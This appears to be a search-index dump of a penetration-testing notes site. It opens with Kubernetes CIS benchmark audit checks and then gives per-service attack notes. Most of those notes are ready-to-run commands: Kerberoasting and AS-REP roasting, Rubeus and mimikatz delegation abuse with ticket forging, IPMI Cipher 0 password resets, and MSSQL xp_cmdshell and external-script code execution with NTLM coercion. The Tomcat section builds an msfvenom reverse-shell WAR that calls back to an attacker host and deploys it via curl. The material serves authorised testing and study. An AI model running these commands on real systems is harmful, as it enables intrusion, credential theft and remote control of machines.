-c %a verif: Verify that the permissions are 644 or more restrictive. Test 81 test: Run the following command: ps -ef | grep kubelet. Find the file specified by the --client-ca-file argument. Run the following command: command: stat -c %U:%G verif: Verify that the ownership is set to root:root. Test 82 test: Run the below command (based on the file location on your system) on the each worker node. command: stat -c %a /var/lib/kubelet/config.yaml verif: Verify that the permissions are 644 or more restrictive. Test 83 test: Run the below command (based on the file location on your system) on the each worker node. command: stat -c %a /var/lib/kubelet/config.yaml verif: Verify that the ownership is set to root:root. Test 84 test: If using a Kubelet configuration file, check that there is an entry for authentication: 'anonymous: enabled' set to false. Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that the --anonymous-auth argument is set to false. This executable argument may be omitted, provided there is a corresponding entry set to false in the Kubelet config file. Test 85 test: Run the following command on each node: command: ps -ef | grep kubelet verif: If the --authorization-mode argument is present check that it is not set to AlwaysAllow. If it is not present check that there is a Kubelet config file specified by --config, and that file sets authorization: mode to something other than AlwaysAllow. It is also possible to review the running configuration of a Kubelet via the /configz endpoint on the Kubelet API port (typically 10250/TCP). Accessing these with appropriate credentials will provide details of the Kubelet's configuration. Test 86 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that the --client-ca-file argument exists and is set to the location of the client certificate authority file. If the --client-ca-file argument is not present, check that there is a Kubelet config file specified by --config, and that the file sets authentication: x509: clientCAFile to the location of the client certificate authority file. Test 87 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that the --read-only-port argument exists and is set to 0. If the --read-only-port argument is not present, check that there is a Kubelet config file specified by --config. Check that if there is a readOnlyPort entry in the file, it is set to 0. Test 88 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that the --streaming-connection-idle-timeout argument is not set to 0. If the argument is not present, and there is a Kubelet config file specified by --config, check that it does not set streamingConnectionIdleTimeout to 0. Test 89 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that the --protect-kernel-defaults argument is set to true. If the --protect-kernel-defaults argument is not present, check that there is a Kubelet config file specified by --config, and that the file sets protectKernelDefaults to true. Test 90 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that if the --make-iptables-util-chains argument exists then it is set to true. If the --make-iptables-util-chains argument does not exist, and there is a Kubelet config file specified by --config, verify that the file does not set makeIPTablesUtilChains to false. Test 91 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that --hostname-override argument does not exist. Note This setting is not configurable via the Kubelet config file. Test 92 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Review the value set for the --event-qps argument and determine whether this has been set to an appropriate level for the cluster. The value of 0 can be used to ensure that all events are captured. If the --event-qps argument does not exist, check that there is a Kubelet config file specified by --config and review the value in this location. Test 93 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that the --tls-cert-file and --tls-private-key-file arguments exist and they are set as appropriate. If these arguments are not present, check that there is a Kubelet config specified by --config and that it contains appropriate settings for tlsCertFile and tlsPrivateKeyFile. Test 94 test: Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that the --rotate-certificates argument is not present, or is set to true. If the --rotate-certificates argument is not present, verify that if there is a Kubelet config file specified by --config, that file does not contain rotateCertificates: false. Test 95 test: Ignore this check if serverTLSBootstrap is true in the kubelet config file or if the --rotateserver-certificates parameter is set on kubelet. Run the following command on each node: command: ps -ef | grep kubelet verif: Verify that RotateKubeletServerCertificate argument exists and is set to true. Test 96 test: The set of cryptographic ciphers currently considered secure is the following:,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_128_GCM_SHA256. Run the following command on each node: command: ps -ef | grep kubelet verif: If the --tls-cipher-suites argument is present, ensure it only contains values included in this set. If it is not present check that there is a Kubelet config file specified by --config, and that file sets TLSCipherSuites: to only include values from this set. Test 97 test: Obtain a list of the principals who have access to the cluster-admin role by reviewing the clusterrolebinding output for each role binding that has access to the cluster-admin role. command: kubectl get clusterrolebindings -o=customcolumns=NAME:.metadata.name,ROLE:.roleRef.name,SUBJECT:.subjects[*].name verif: Review each principal listed and ensure that cluster-admin privilege is required for it. Test 98 test: Review the users who have get, list or watch access to secrets objects in the Kubernetes API. command: # NO COMMAND verif: Test 99 test: Retrieve the roles defined across each namespaces in the cluster and review for wildcards command: kubectl get roles --all-namespaces -o yaml verif: Verify wildcard are not used Test 100 test: Retrieve the cluster roles defined in the cluster and review for wildcards command: kubectl get clusterroles -o yaml verif: Verify wildcard are not used Test 101 test: Review the users who have create access to pod objects in the Kubernetes API. command: # NO COMMAND verif: Test 102 test: For each namespace in the cluster, review the rights assigned to the default service account command: # NO COMMAND verif: Ensure that it has no roles or cluster roles bound to it apart from the defaults. Additionally ensure that the automountServiceAccountToken: false setting is in place for each default service account. Test 103 test: Review pod and service account objects in the cluster command: # NO COMMAND verif: Ensure that the option below is set, unless the resource explicitly requires this access.automountServiceAccountToken: false Test 104 test: Review a list of all credentials which have access to the cluster command: # NO COMMAND verif: Ensure that the group system:masters is not used. Test 105 test: Review the users who have access to cluster roles or roles which provide the impersonate, bind or escalate privileges. command: verif: Test 106 test: Get the set of PSPs with the following command: kubectl get psp. For each PSP, check whether privileged is enabled: command: kubectl get psp -o=jsonpath='{.spec.privileged}' verif: Verify that there is at least one PSP which does not return true. Test 107 test: Get the set of PSPs with the following command: kubectl get psp. For each PSP, check whether privileged is enabled: command: kubectl get psp -o=jsonpath='{.spec.hostPID}' verif: Verify that there is at least one PSP which does not return true. Test 108 test: Get the set of PSPs with the following command: kubectl get psp. For each PSP, check whether privileged is enabled: command: kubectl get psp -o=jsonpath='{.spec.hostIPC}' verif: Verify that there is at least one PSP which does not return true. Test 109 test: Get the set of PSPs with the following command: kubectl get psp. For each PSP, check whether privileged is enabled: command: kubectl get psp -o=jsonpath='{.spec.hostNetwork}' verif: Verify that there is at least one PSP which does not return true. Test 110 test: Get the set of PSPs with the following command: kubectl get psp. For each PSP, check whether privileged is enabled: command: kubectl get psp -o=jsonpath='{.spec.allowPrivilegeEscalation}' verif: Verify that there is at least one PSP which does not return true. Test 111 test: Get the set of PSPs with the following command: kubectl get psp. For each PSP, check whether running containers as root is enabled: command: kubectl get psp -o=jsonpath='{.spec.runAsUser.rule}' verif: Verify that there is at least one PSP which returns MustRunAsNonRoot or MustRunAs with the range of UIDs not including 0. Test 112 test: Get the set of PSPs with the following command: kubectl get psp. For each PSP, check whether NET_RAW is disabled: command: kubectl get psp -o=jsonpath='{.spec.requiredDropCapabilities}' verif: Verify that there is at least one PSP which returns NET_RAW or ALL. Test 113 test: Get the set of PSPs with the following command: command: kubectl get psp verif: Verify that there are no PSPs present which have allowedCapabilities set to anything other than an empty array. Test 114 test: Get the set of PSPs with the following command: kubectl get psp. For each PSP, check whether capabilities have been forbidden: command: kubectl get psp -o=jsonpath='{.spec.requiredDropCapabilities}' verif: Test 115 test: Review the documentation of CNI plugin in use by the cluster command: # NO COMMAND verif: Confirm that it supports Ingress and Egress network policies. Test 116 test: Run the below command and review the NetworkPolicy objects created in the cluster. command: kubectl --all-namespaces get networkpolicy verif: Ensure that each namespace defined in the cluster has at least one Network Policy. Test 117 test: Run the following command to find references to objects which use environment variables defined from secret command: kubectl get all -o jsonpath='{range .items[?(@..secretKeyRef)]} {.kind} {.metadata.name} {\"\\n\"}{end}' -A verif: Test 118 test: Review your secrets management implementation. command: # NO COMMAND verif: Test 119 test: Review the pod definitions in your cluster command: # NO COMMAND verif: Verify that image provenance is configured as appropriate. Test 120 test: Run the below command and review the namespaces created in the cluster. command: kubectl get namespaces verif: Ensure that these namespaces are the ones you need and are adequately administered as per your requirements. Test 121 test: Review the pod definitions in your cluster. command: # NO COMMAND verif: Verify it create a line as follow: securityContext: seccompProfile: type: RuntimeDefault Test 122 test: Review the pod definitions in your cluster command: # NO COMMAND verif: verify that you have security contexts defined as appropriate. Test 123 test: Run this command to list objects in default namespace command: kubectl get all verif: The only entries there should be system managed resources such as the kubernetes service "},"Pentest/Services/AD.html":{"url":"Pentest/Services/AD.html","title":"AD","keywords":"","body":"AD Table of content Get users description Get users description Retrieve the description of users ./windapsearch-linux-amd64 -u alice --hash '7f004ce6b8f7b2a3b6c477806799b9c0' --dc 10.11.1.20 -m custom --filter '(&(objectclass=user)(!(objectclass=computer)))' --attrs description "},"Pentest/Services/DNS.html":{"url":"Pentest/Services/DNS.html","title":"DNS","keywords":"","body":"DNS Port: 53 Protocol: tcp/udp Table of content Zone transfer Zone transfer dig axfr ${domain} @${ip} "},"Pentest/Services/IPMI.html":{"url":"Pentest/Services/IPMI.html","title":"IPMI","keywords":"","body":"IPMI Port: 623 Protocol: udp/tcp Table of content Dump hash Cipher 0 Set password Ressources Dump hash A flaw in the IPMI implementation allows the retrieval of users hashes # MSF use auxiliary/scanner/ipmi/ipmi_dumphashes # Nmap https://github.com/cldrn/external-nse-script-library/blob/master/ipmi-dump-hashes.nse The hashes can be cracked using hashcat or john hashcat -m 7300 Cipher 0 IPMI2.0 is vulnerable to an authentication bypass when the Cipher 0 option is used. However, a valid username is needed for the exploitation. apt-get install ipmitool ipmitool -I lanplus -C 0 -H ${ip} -U ${user} -P ${randomString} user list # ID Name Callin Link Auth IPMI Msg Channel Priv Limit # 2 root true true true ADMINISTRATOR # 3 Oper1 true true true ADMINISTRATOR Set password # Using Cipher0 vulnerability ipmitool -I lanplus -C 0 -H ${ip} -U ${user} -P ${randomString} user set password ${userId} abc123 # Otherwise ipmitool -I lanplus -H ${ip} -U ${user} -P ${randomString} user set password ${userId} abc123 The ${userId} is the one retrieved with the user list command. Ressources Exploit IPMI : https://book.hacktricks.xyz/pentesting/623-udp-ipmi "},"Pentest/Services/Kerberos.html":{"url":"Pentest/Services/Kerberos.html","title":"Kerberos","keywords":"","body":"Kerberos Port: 88 Protocol: tcp, udp Table of content Overview Bruteforce users Kerberoasting AS-REP Roasting Unconstrained delegation Overview Printer Bug Constrained Delegation S4U Self abuse Get a TGT Get a TGS Fix the service name Overview The following figure shows the principal step of Kerberos proper functioning: During user login, AS-REQ request to the Key Distribution Center (KDC) usually exposed by the Domain Controller. This request asks for a TGT with a secret derived from the user password The KDC verify the secret key and return the TGT as an AS-REP message if the secret key can be validated against the user password stored in the AD. The TGT contains the user identity and is encrypted using the KDC secret key (ie the krbtgt account password) When the user wants to access a service, it asks for a Ticket Granting Service (TGS) to the KDC through a TGS-REQ message with the Service Principal Name (SPN) and its TGS. The SPN identify the service and the TGS authenticate the user. An SPN is an identifier linking the service instance with a logon account. They are configured in the User Object in AD The KDC verify that the user TGT and then sends back the TGS through a TGS-REP message. The KDC does not verify if the user can access the service, but when the service is reached and a TGS is presented as a means of authentication, it will inspect the ticket and decide whereas the user is authorized to access the service or not. A TGS for a given service can be generated even if the user is not authorized to access the service. The KDC is for authentication only and not authorization. The TGS is encrypted with the service account password Bruteforce users Kerberos can be used to enumerate valid users on the domain. Use kerbrute: kerbrute userenum --domain ${domainName} ${userList} --dc ${dcIp} Kerberoasting Part of the TGS is encrypted with the service account password. It is then possible to crack them offline to retrieve the service account password. Kerberosting is not really OPSEC : an event is 4769 is generated when a service ticket is generated. Some companies use fake service accounts as honey pot. When a ticket is requested for this fake service account, an alert is raised. Thus, when wanting to perform Kerberoast attacks, search manually service accounts and ask for a TGS selectively. The following LDAP query can be used to look at SPN account: # LDAP (&(sAMAccountType=805306368)(servicePrincipalName=*)) # Bloodhound MATCH (u:User {hasspn:true}) RETURN u Impacket can be used to get the ticket from these users: impacket-GetUserSPNs ${domain}/${user}:{password} -request -dc-ip 10.10.10.169 Worth a try without any password imapcket-GetUserSPNs ${domain}/${user} -request -dc-ip 10.10.10.169 -no-pass AS-REP Roasting If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user. Then the TGS can be cracked to retrieve the password. The following LDAP query can be used to retrieve users impacted: # LDAP (&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) # Bloodhound MATCH (u:User {dontreqpreauth:true}) RETURN u AS-REP is not OPSEC and should not be used A list of possible username can be generated using username-anarchy or namemash while read p; do GetNPUsers.py ${domain}/\"$p\" -request -no-pass -dc-ip ${dcIp} >> hash.txt; done # The / at the end is mandatory impacket-GetNPUsers -no-pass -usersfile ${usersList} -format john -dc-ip ${dcIp} ${domain}/ Unconstrained delegation Overview Delegation allows a user or a service to act on behalf of another user to another service. For example, if an exposed service is used as a proxy to a database, the user will authenticate on the exposed service and the service will be able to authenticate itself on the behalf of the user to the database. When a service with Unconstrained Delegation authenticate to another service, its TGS used to authenticate on the remote service will contain the TGT of the user connecting to the local service. This TGT will be cached in memory. So if an admin access to a service with unconstrained delegation, its TGT will be cached in memory. Thus, if the machine is compromised, all TGT can be dumped to impersonate users. Unconstrained Delegation can be found using the following LDAP request: # LDAP (&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)) # Bloodhound MATCH (c:Computer {unconstraineddelegation:true}) RETURN c Rubeus can be used to monitor and dump TGT on a machine. When a TGT is found, it can then be injected on the user session with CobaltStrike: Retrieve the base64 ticket and write it in a .kirbi file Create sacrificial logon session : make_token ${domain}\\${user} fakePassword Inject the TGT: kerberos_ticker_use ${pathToKirbi} Printer Bug This bug allows an adversary to coerce a forest's machine (MACHINE A) to perform authentication on another forest's machine (MACHINE B). The authentication is triggered through RPC calls such as RpcRemoteFindFirstPrinterChangeNotificationEx that notify a change between a printer server (MACHINE A) and a printer client (MACHINE B), hence the authentication of the \"new\" printer server to the client. If the MACHINE B is configured with Unconstrained Delegation, it will be possible to retrieve a TGT for MACHINE A on MACHINE B. Hence, using this MACHINE A TGT it will be possible to retrieve TGS for every service on MACHINE A and thus compromise the machine. If MACHINE A is a Domain Controller, you will compromise the domain. The proof of concept code can be found here. On the MACHINE B configured with Unconstrained Delegation a run Rubeus to monitor for new TGT: Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap On your workstation, run the SpoolSample proof of concept on your workstations: SpoolSample.exe ${MACHINE A} ${MACHINE B} Once the MACHINE A TGT is retrieved, it can be injected in the CS session using make_token and kerberos_ticket_use as explained in the Unconstrained Delegation part. Constrained Delegation With Constrained Delegation the server does not cache the TGT anymore, but will be able to request TGS for specific services on the behalf of other users with its own TGT. The Constrained Delegation computers can be found using the following LDAP request: # Search for user AND computer as Constrained Delegation can be configured for both these objects # LDAP (&(objectCategory=computer)(msds-allowedtodelegateto=*)) # Bloodhound MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p To exploit the Constrained Delegation the TGT of the server must be retrieved using mimikatz: mimikatz sekurlsa::ekeys # Use the AES keys to generate a `TGT` Rubeus.exe asktgt /user:${machineAccount} /aes256:${aesKey} /opsec /nowrap Or Rubeus: Rubeus.exe triage Then, a TGS can be generated. This TGS, generated with the Constrained Delegation server TGT, will impersonate the user: Rubeus.exe s4u /impersonateuser:${userToImpersonate} /msdsspn:${spnToImpersonate} /user:${principalAllowedToPerformDelegation} /ticket:${base64TGT} /nowrap s4u does not check the spn using the /altservice:${serviceName} parameter. Thus, you can in fact ask a TGS for any service of the machine contained in the Constrained Delegation parameter. S4U Self abuse The Service For User (S4U) contains two interesting extensions: Service For User To Self which allows a service to obtain a TGS on behalf of another user Service For User to Proxy which allows a service to obtain a TGS on behalf of another user on another service During Constrained Delegation exploit, these two extensions are used to first obtain a TGS on the Constrained Delegation machine on behalf of the user using S4U2Self and then, to obtain TGS on the specific targeted service on the remote machine using S4U2Proxy. The S4U can be leveraged to escalate from System Account to Administrator on a machine. Get a TGT Indeed, even if running with local service account, the network connections are authenticated using the Computer Account. It is then possible to retrieve a TGT for the Computer Account using Rubeus: ./Rubeus.exe tgtdeleg /nowrap Get a TGS Then, once the TGT is acquired, a TGS is generated. This TGS is generated using S4USelf and will impersonate a user that IS a machine local admin (Domain Administrator for example): Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap The Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed. Fix the service name The generated ticket is not crafted with an interesting service name. However, the service name is not included in the TGS ciphered data and can be modified at will. The TGS can be modified using ASN1Editor. Change the instances where GENERAL \"${computerAccount} appears: Replace the string with cifs On the parent sequence, add a new string node with 1b as tag fields and the machine FQDN as value Save the ticket Or, simply through Rubeus: Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt You can use Rubeus to ensure the ticket has been well modified : Rubeus.exe describe /ticket:${pathToTicket} You can now inject the ticket in your session. Look at this lab to test the technique ! "},"Pentest/Services/LDAP.html":{"url":"Pentest/Services/LDAP.html","title":"LDAP","keywords":"","body":"Ldap Table of content Nmap Windapsearch Connection Get users description Impacket Python AD Python bloodhound Nmap nmap -n -sV --script \"ldap* and not brute\" ${ip} Windapsearch Connection With standard windasearch # https://github.com/ropnop/windapsearch python3 windapsearch.py -d ${domain} --dc-ip ${dcIp} -U Get users description With go-windapsearch ./windapsearch-linux-amd64 -u alice --hash '7f004ce6b8f7b2a3b6c477806799b9c0' --dc 10.11.1.20 -m custom --filter '(&(objectclass=user)(!(objectclass=computer)))' --attrs description Impacket # Impacket GetADUsers.py -all ${domain}/ -dc-ip ${dcIp} Python import ldap3 server = ldap3.Server('10.10.10.175', get_info = ldap3.ALL, port=389) connection = ldap3.Connection(server) connection.bind() # Get basic info # print(server.info) # Enumerate object from the ldap using the naming context returned by server.info # connection.search(search_base='CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*') # print(connection.entries) AD Python bloodhound python\" -m bloodhound -u ${user} -p ${password} -ns ${dcIp} -d ${domain} -c all If the DNS is not exposed by the DC, remplace dcIp by the DNS ip "},"Pentest/Services/Memcached.html":{"url":"Pentest/Services/Memcached.html","title":"Memcached","keywords":"","body":"Memcached Port: 11211 Protocol: tcp Table of content Get stats Access keys Get stats # Get version echo \"version\" | nc -vn -w 1 ${ip} 11211 # Get status echo \"stats\" | nc -vn -w 1 ${ip} 11211 # Get slabs echo \"stats slabs\" | nc -vn -w 1 ${ip} 11211 sudo apt install libmemcached-tools # Get stats memcstat --servers=${ip} # Get all items memcdump --servers=${ip} # Get info inside the item(s) memccat --servers=${ip} ${key1} ${key2} ${key3} Access keys # Get items of slabs with info echo \"stats items\" | nc -vn -w 1 ${ip} 11211 # Get key names (the 0 is for unlimited output size) echo \"stats cachedump ${itemNumber} 0\" | nc -vn -w 1 ${ip} 11211 # Get saved info echo \"get ${itemName}\" | nc -vn -w 1 ${ip} 11211 "},"Pentest/Services/NFS.html":{"url":"Pentest/Services/NFS.html","title":"NFS","keywords":"","body":"NFS - Mountd Port: 2049 Protocol : tcp Table of content Description Showmount Mount share Description NFS is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory. For the user point of view it looks like simple SMB file share. apt-get install nfs-common Showmount List the network shares showmount -e ${ip} Mount share mount ${ip}:/${sharePath} ${mountPoint} "},"Pentest/Services/Oracle database.html":{"url":"Pentest/Services/Oracle database.html","title":"Oracle Database","keywords":"","body":"Oracle Database Port: 1521 Protocol: tcp Table of content Description SID bruteforce Creds bruteforce SQLPlus RCE through SQL Description The idea is to enumerate the SID, then enumerate the user and finaly connect to the database. If the privileges allows it, it is possible to connect as sysdba and load a malicious file. SID bruteforce nmap --script oracle-sid-brute ${ip} Creds bruteforce # Default creds list : /usr/share/nmap/nselib/data/oracle-default-accounts.lst # Use brute.credfile to load specific user/password list nmap --script oracle-brute --script-args oracle-brute.sid=${oracleSID} ${ip} SQLPlus # Connection with the user sqlplus ${user}/${pass}@${ip}:${port}/${SID} # Connection with the user but with sysdba privileges sqlplus ${user}/${pass}@${ip}:${port}/${SID} as sysdba RCE through SQL The / at the end of the payload is mandatory. declare f utl_file.file_type; s varchar(5000) := '${maliciousContent}'; begin f := utl_file.fopen(${path}, ${file}, 'W'); utl_file.put_line(f,s); utl_file.fclose(f); end; / "},"Pentest/Services/MSSQL.html":{"url":"Pentest/Services/MSSQL.html","title":"MSSQL","keywords":"","body":"MSSQL Port: 1433 Protocol: tcp Table of content Tools PowerUpSQL Get domain MSSQL databases Query a database mssql-cli RCE Run external script xp_cmdshell File system enumeration Enumerate the files Read file content NTLM coercion Lateral Movement References Tools PowerUpSQL PowerUpSQL is a list of PowerShell script that can be help to enumerate and interact with MSSQL database. Get domain MSSQL databases Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo Query a database Get-SQLQuery -Instance \"${dbIp},${dbPort}\" -Query \"${sqlQuery}\" mssql-cli mssql-cli is a python CLI tool that can be used to get an interactive session with the database: # dbName is optional mssql-cli -S ${dbIp} -d ${dbName} -U ${username} -P ${password} RCE Run external script On Azure MSSQL it is possible to run external Python or R script with the following command : EXEC sp_execute_external_script @language = N'R', @script = N'data.frame(print(system(\"cmd.exe /C whoami\", intern=T)))' Or, with a python script : EXEC sp_configure 'show advanced options', 1 ; GO RECONFIGURE; EXECUTE sp_configure 'external scripts enabled', 1; GO RECONFIGURE; GO EXEC sp_execute_external_script @language = N'Python' , @script = N'import subprocess; cmd = [\"whoami\",\"ipconfig\"]; a = \"\"; for c in cmd: a += subprocess.check_output(c.split(\" \"), shell=True).decode()+\"\\r\\n\"; a = [elt for elt in a.split(\"\\r\\n\") if a.strip() != \"\"]; a = \"\\n\".join(a); print(a); ' GO xp_cmdshell xp_cmdshell is a procedure that will execute a system command. It can be activated using the following commands: EXEC sp_configure 'show advanced options', 1 ; GO RECONFIGURE; GO EXEC sp_configure 'xp_cmdshell', 1 GO RECONFIGURE; GO Then: EXEC xp_cmdshell 'whoami'; File system enumeration Ole Automation Procedures should be activated to access some file system procedures: sp_configure 'show advanced options', 1; GO RECONFIGURE; GO sp_configure 'Ole Automation Procedures', 1; GO RECONFIGURE; GO Enumerate the files SELECT * FROM sys.dm_os_enumerate_filesystem('C:\\', '*'); Read file content SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\win.ini', SINGLE_CLOB) AS Contents NTLM coercion It is possible to coerce MSSQL to perform an authenticated request against a choosen server in order to relay or catch the NetNTLM hash: EXEC xp_dirtree '\\\\${ip}\\foo', 1, 1 Lateral Movement MYSQL servers can be linked on to each other. Once a server is compromised, it can be possible to compromise other MSSQL instances. The following query can be used to find linked MSSQL instances: SELECT * FROM master..sysservers; Likewise, PowerUpSQL can be used to automate the discovery of remote instances: powershell Get-SQLServerLinkCrawl -Instance \"${initialDbIp},1433\" Then, the remote instance can be queried using the following request: SELECT * FROM OPENQUERY(\"${dbIp}\", '${sqlQuery}'); It is also possible to modify the remote MSSQL parameters using the following command: EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [${dbIp}] References https://blog.dbdigger.com/enable-and-work-with-xp_cmdshell-in-sql-server-2008-r2/ https://stackoverflow.com/questions/7048839/sql-server-query-to-find-all-permissions-access-for-all-users-in-a-database https://labs.f-secure.com/assets/BlogFiles/mwri-a-penetration-testers-guide-to-the-azure-cloud-v1.2.pdf https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-credential-passwords/ "},"Pentest/Services/RPC.html":{"url":"Pentest/Services/RPC.html","title":"RPC","keywords":"","body":"RPC Port: 135 Protocol : udp Table of content Rpcdump Rpcclient Rpcdump Identifying exposed RPC services # Impacket rpcdump.py ${ip} Rpcclient Connect to RPC with NULL password sudo apt-get install smbclient rpcclient -U ${user} -N ${ip} "},"Pentest/Services/SMB.html":{"url":"Pentest/Services/SMB.html","title":"SMB","keywords":"","body":"SMB Port: 445 Protocol : tcp Table of content Smbmap SMBClient Parse all shares Eternalblue Samba Get version Smbmap Perform auto-enumeration with smbmap apt-get install smbmap smbmap -H ${ip} -u ${user} Use null to test anonymous access SMBClient Use SMBClient to access to remote SMB share # List exposed share smbclient -m ${smbVersion} -L \\\\\\\\${ip}/ # Access to the share smbclient -m ${smbVersion} \\\\\\\\${ip}\\\\${shareName} Parse all shares Use Snaffler to automatize file share parsing .\\Snafller.exe -o ${logFile} -s -v Data -d ${domainName} -c ${dcIp} Eternalblue WinXP : https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/ https://root4loot.com/post/eternalblue_manual_exploit/ https://github.com/worawit/MS17-010 Samba Get version The Samba version can be retrieved through the packet exchanged on port 139. # In one terminal ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 # On another one smbclient -L ${ip} # Exemple of output : ##################### # T 192.168.119.136:59244 -> 10.11.1.136:139 [AP] #20 # .....SMBr.....C......................j..MICROSOFT NETWORKS 3.0..LANMAN1.0..LM1.2X002..DOS LANMAN2.1..LANMAN2.1..Samba..NT LANMAN 1.0..NT LM 0.12. #### # T 10.11.1.136:139 -> 192.168.119.136:59244 [AP] #24 # ...f.SMBs..................................=..U.n.i.x...S.a.m.b.a. .3...0...2.4...T.H.I.N.C...L.O.C.A.L... #!/bin/sh #Description: # Requires root or enough permissions to use tcpdump # Will listen for the first 7 packets of a null login # and grab the SMB Version #Notes: # Will sometimes not capture or will print multiple # lines. May need to run a second time for success. if [ -z $1 ]; then echo \"Usage: ./smbver.sh RHOST {RPORT}\" && exit; else rhost=$1; fi if [ ! -z $2 ]; then rport=$2; else rport=139; fi tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i \"samba\\|s.a.m\" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\\n' & echo -n \"$rhost: \" & echo \"exit\" | smbclient -L $rhost 1>/dev/null 2>/dev/null sleep 0.5 && echo \"\" Run the script as : script.sh ${ip} "},"Pentest/Services/SNMP.html":{"url":"Pentest/Services/SNMP.html","title":"SNMP","keywords":"","body":"SNMP Port: 161 Protocol : udp Table of content Nmap Onesixtyone Snmpenum Snmpwalk Read values Write values Ressources Nmap snmp-brute: brute-force snmp community strings snmp-interfaces: list target network interfaces Onesixtyone This tool can be used to brute-force community strings. sudo apt install onesixtyone onesixtyone -c ${wordlist} ${ip} The following wordlist is given with the software /usr/share/doc/onesixtyone/dict.txt Snmpenum Auto enumeration sudo cpan Net::SNMP git clone https://raw.githubusercontent.com/ajohnston9/snmpenum ./snmpenum.pl ${ip} ${community} ${conf} The configuration file is given in the git. Choose the one related to the target's OS. Snmpwalk sudo apt-get install snmp snmp-mibs-downloader In /etc/snmp/snmp.conf, comment the mibs: line. Read values Enumerate SNMP with snmpwalk snmpwalk -c ${community} ${ip} -v${version} # Version : 1, 2c # # Output # iso.3.6.1.2.1.1.1.0 = STRING: \"Linux pandora 5.4.# 0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC # 2021 x86_64\" # iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10 # iso.3.6.1.2.1.1.3.0 = Timeticks: (4973873) 13:48:58.# 73 # iso.3.6.1.2.1.1.4.0 = STRING: \"Daniel\" # iso.3.6.1.2.1.1.5.0 = STRING: \"pandora\" # iso.3.6.1.2.1.1.6.0 = STRING: \"Mississippi\" # iso.3.6.1.2.1.1.7.0 = INTEGER: 72 # iso.3.6.1.2.1.1.8.0 = Timeticks: (80) 0:00:00.80 # iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.# 1 # iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.# 1 # [...] Machine name : 3.6.1.2.1.1.5.0 Disk information : 1.3.6.1.4.1.2021.9 Custom extension : .1.3.6.1.4.1.8072.1.3.2 Write values Modify SNMP value with snmpset snmpset -v 1 -c ${community} ${ip} ${paramName} s ${value} paramName : the value outputed by snmpwalk. For example : iso.3.6.1.2.1.1.5.0 Ressources Exploit SNMP: https://resources.infosecinstitute.com/topic/snmp-pentesting/ "},"Pentest/Services/Tomcat.html":{"url":"Pentest/Services/Tomcat.html","title":"Tomcat","keywords":"","body":"Tomcat Exploit manager-script privileges tomcat-users.xml Exploit manager-script privileges Generate a WAR reverse shellmsfvenom -p java/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f war -o shell.war Upload the shellcurl -v -u ${user}:${password} --upload-file shell.war 'http://${url}:${port}/manager/text/deploy?path =/foo&update=true' Trigger the shellcurl http://${url}:${port}/foo tomcat-users.xml Possible paths : $CATALINA_HOME/conf/tomcat-users.xml /usr/share/tomcat9/conf/tomcat-users.xml /usr/share/tomcat9/etc/tomcat-users.xml IF RETRIEVED THROUGH LFI USE CURL OR VIEW SOURCE PAGE AS THE FILE IS AN XML FILE AND WILL NOT BE DISPLAYED BY THE NAVIGATOR "},"Pentest/Services/WebDAV.html":{"url":"Pentest/Services/WebDAV.html","title":"WebDAV","keywords":"","body":"WebDAV Table of content Arbitrary file upload Arbitrary file upload Davtest can be used to test arbitrary file upload. davtest -url ${url} However, sometimes false negative are sent back by the tool, and manual testing can be interesting: # Upload the ${filename} on the ${filename_url} curl -X PUT http://${ip}/${filename_url} -d @${filename} # Test if the upload succeed curl http://${ip}/${filename_url} Finaly, cadaver is a framework than can help to work with upload and uploaded files. # Open the cadaver shell cadaver http://${ip}/${directory} # It is possible to upload file with `put`, move directory with `cd` and rename files with `mv` dav:/${directory}/> cd .. dav:/> put shell.txt dav:/> mv shell.txt shell.aspx The following blog post sumary the attacks: 